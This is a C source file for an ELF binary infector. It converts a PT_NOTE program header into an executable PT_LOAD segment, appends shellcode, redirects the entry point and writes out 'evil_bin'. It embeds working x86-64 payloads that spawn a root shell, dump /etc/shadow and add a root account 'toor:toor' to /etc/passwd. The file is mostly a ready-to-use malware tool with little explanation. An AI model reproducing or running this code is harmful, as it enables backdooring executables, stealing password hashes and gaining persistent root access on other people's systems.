#include <sys/stat.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


struct shellcode {
	int length;
	unsigned char byte_code[512];
};

void choose_shellcode(struct shellcode*);
int find_note(char*, int, int);
int injection(char*, int, struct shellcode*);
int magic_check(char*);

int main(int argc, char **argv)
{

	if(argc<2){
		printf("This program is used to rebuild an ELF binary file with executable shellcode\n");
		printf("Usage: ./inject [file]\n");
        exit(1);

	}
	char* filename = argv[1];

	if(magic_check(filename)==0){
		printf("Not a valid ELF file!\n");
		exit(1);
	}

	printf("File is a valid ELF\n");


	unsigned char headers[64];

	//Read in our elf header (64 bytes)
	FILE* ptr = fopen(filename, "rb");
 	fseek(ptr, 0, SEEK_SET);	
	fread(headers, sizeof(headers), 1, ptr);
	
	fseek(ptr, 0L, SEEK_END);
        u_int64_t sz = ftell(ptr);

	fclose(ptr);
	

	//Initialize variables for elf header with exact number of bits
	//Calculate number doing unsigned char -> int conversion shifting bits as needed
	u_int64_t offset = 0;
	u_int16_t num_headers = 0;
	u_int16_t header_size = 0;
	int success = 0;
	struct shellcode* code = (struct shellcode*)malloc(sizeof(struct shellcode));

	//calculate offset of pheaders
	offset = offset | (u_int8_t)headers[0x20+7];
	offset = (offset << 8) | (u_int8_t)headers[0x20+6];
	offset = (offset << 16) | (u_int8_t)headers[0x20+5];
	offset = (offset << 24) | (u_int8_t)headers[0x20+4];
	offset = (offset << 32) | (u_int8_t)headers[0x20+3];
	offset = (offset << 40) | (u_int8_t)headers[0x20+2];
	offset = (offset << 48) | (u_int8_t)headers[0x20+1];
	offset = (offset << 56) | (u_int8_t)headers[0x20];

	//calculate num_headers
 	num_headers = num_headers | (u_int8_t)headers[0x38+1];	
 	num_headers = (num_headers << 8) | (u_int8_t)headers[0x38];

	//calculate header_size
	header_size = header_size | (u_int8_t)headers[0x36+1];
	header_size = (header_size << 8) | (u_int8_t)headers[0x36];
		

	int note_offset = 0;
	char option[5];
	//In the future, check fp for errors
	for(int i = 1; i <= num_headers; i++){
		
		note_offset = find_note(filename, offset, header_size);
		offset = offset+header_size;
		if(note_offset != 0){
			printf("Found a NOTE!\nInject? (y/n) ");

			//Prompt for user yes/no
			fgets(option, sizeof(option), stdin);

			//If answer begins with y
			if(option[0]==0x79){
				choose_shellcode(code);
				success = injection(filename, note_offset, code);
			}
		}
	}

	//Make sure new file size is old file size + shellcode
	if(success == 1){
		printf("File was successfully written\n");
		exit(1);
	}
	
	printf("Error in writing file! New binary is not original_size+parasite_size\n");
	exit(1);
}

/**
* Function used to find a PT_NOTE section
**/
int find_note(char* filename, int offset, int header_size){

	//eventually i'll add more output, but for now just find the note header
	unsigned char buffer[header_size];

	FILE* ptr = fopen(filename, "rb");

	fseek(ptr, offset, SEEK_SET);

	fread(buffer, sizeof(buffer), 1, ptr);

	if(buffer[0] == 0x04){
		return offset;
	}


	return 0;	
	

}


/**
* Function used to inject shellcode into the target file
**/
int injection(char* filename, int offset, struct shellcode* code){
	


        FILE* fp = fopen(filename,"rb");

        fseek(fp, 0L, SEEK_END);
        u_int64_t sz = ftell(fp);
        rewind(fp);

	//Calculate our offset address (hex of our eof)	
	unsigned char bytes[8];
	bytes[7] = (sz >> 56) & 0xFF;
	bytes[6] = (sz >> 48) & 0xFF;
	bytes[5] = (sz >> 40) & 0xFF;
	bytes[4] = (sz >> 32) & 0xFF;
	bytes[3] = (sz >> 24) & 0xFF;
	bytes[2] = (sz >> 16) & 0xFF;
	bytes[1] = (sz >> 8) & 0xFF;
	bytes[0] = sz & 0xFF;

	unsigned char evil_buffer[sz+code->length];

	fread(evil_buffer,sizeof(evil_buffer),1,fp);

	//set header to PT_LOAD
	evil_buffer[offset] = 0x01;

	//set to RWX
	evil_buffer[offset+4] = 0x07;

	//p_vaddr to offset parasite (eof)
	memcpy(&evil_buffer[offset+(int)0x10], bytes, 8);


	//offset for shellcode (end of file)
	memcpy(&evil_buffer[offset+8], bytes, 8);


 	//edit entry point	
	memcpy(&evil_buffer[(int)0x18], bytes, 8);

	//Adust file size and memory size by compounding our shellcode bytes
	evil_buffer[offset+(int)0x20] = evil_buffer[offset+(int)0x20]+code->length;
	evil_buffer[offset+(int)0x28] = evil_buffer[offset+(int)0x28]+code->length;
	
	//copy our shellcode into the end of our file buffer
	memcpy(&evil_buffer[sz], code->byte_code, code->length);

	//Create new file for writing
	FILE* new_file = fopen("evil_bin", "wb");

	//write our evil buffer to memory
	fwrite(evil_buffer, sizeof(evil_buffer),1,new_file);

	//Get new file size 
        u_int64_t new_sz = ftell(new_file);

	fclose(new_file);

	//Return 1 if our new file is original size + shellcode size
	if(new_sz == sz+code->length)
		chmod("evil_bin", 0777);
		return 1;

	return 0;
}


/**
 * Function used to check if our file is a valid ELF
 **/
int magic_check(char* filename){

	unsigned char buffer[4];

	FILE* ptr = fopen(filename, "rb");
	
	fread(buffer, sizeof(buffer), 1, ptr);

	//Check magic bytes for ELF
	if(buffer[0]==0x7f && buffer[1]==0x45 && buffer[2]==0x4c && buffer[3] == 0x46){
	       return 1;
	}

	fclose(ptr);

	return 0;	

}
void choose_shellcode(struct shellcode* code){
	
	unsigned char* payload;
	printf("Which shellcode would you like to inject? (1) spawn root shell (2) cat /etc/shadow (3) add root user toor:toor \n");	
	char option[3];
	fgets(option, sizeof(option), stdin);

	int choice = atoi(option);

	switch(choice){

		//spawn root shell
		case 1: ;
			payload = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
			code->length = 23;
			memcpy(&code->byte_code, payload, 23);
			
			break;		
		
		//cat /etc/shadow
		case 2: ;
			payload = "\x48\x31\xc0\x48\x31\xed\x50\x48\xbd\x63\x2f\x73\x68\x61\x64\x6f\x77\x55\x48\xbd\x2f\x2f\x2f\x2f\x2f\x2f\x65\x74\x55\x48\x89\xe5\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe3\x48\x89\xe7\x50\x48\x89\xe2\x55\x53\x48\x89\xe6\x66\x6a\x3b\x66\x58\x0f\x05";			 		   code->length = 66;
			memcpy(&code->byte_code, payload, 66);
			break;


		//add root user toor:toor
		case 3: ;
			payload = "\x31\xdb\xf7\xe3\x50\xbb\xff\x73\x77\x64\xc1\xeb\x08\x53\x48\xbb\x2f\x65\x74\x63\x2f\x70\x61\x73\x53\x48\x89\xe7\x87\xf2\x66\xbe\x01\x04\x04\x02\x0f\x05\x48\x97\xeb\x0e\x5e\x6a\x01\x58\x6a\x26\x5a\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xed\xff\xff\xff\x74\x6f\x6f\x72\x3a\x73\x58\x75\x43\x4b\x69\x37\x6b\x33\x58\x68\x2f\x73\x3a\x30\x3a\x30\x3a\x3a\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a";
			code->length = 99;
			memcpy(&code->byte_code, payload, 99);
			break;


	}

}
